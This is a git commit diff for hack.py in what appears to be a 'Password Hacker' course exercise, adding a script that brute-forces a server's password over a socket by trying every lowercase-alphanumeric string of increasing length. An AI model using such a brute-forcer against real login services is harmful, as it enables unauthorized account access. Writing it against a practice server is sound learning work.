69110719869bacb34971fbb05c9c0621c6da0232
Joseph <joseph-so@gmx.net>
2020-05-09 16:33:43 +1000

    Complete task 2

--- Password Hacker/task/hacking/hack.py
+++ Password Hacker/task/hacking/hack.py
@@ -1,18 +1,38 @@
 # write your code here
+import itertools
 import socket
 import sys
+
+
+def password_generator(length):
+    for m in itertools.product(itertools.chain(range(97, 123), range(48, 58)), repeat=length):
+        yield ''.join(map(chr, iter(m)))
+
 
 args = sys.argv
 ip = args[1]
 port = int(args[2])
-message = args[3]
 
-client_socket = socket.socket()
-address = (ip, port)
-client_socket.connect(address)
-client_socket.send(message.encode())
+with socket.socket() as client_socket:
+    address = (ip, port)
+    client_socket.connect(address)
+    message = 'Wrong password!'
+    password = ""
 
-response = client_socket.recv(1024)
-print(response.decode())
+    i = 1
 
-client_socket.close()
+    while message == 'Wrong password!':
+        for p in password_generator(i):
+            client_socket.send(p.encode())
+            response = client_socket.recv(1024)
+            message = response.decode()
+            if message != 'Wrong password!':
+                password = p
+                break
+        i += 1
+
+    if message == 'Connection success!':
+        print(password)
+    else:
+        print("Too Many attempts")
+
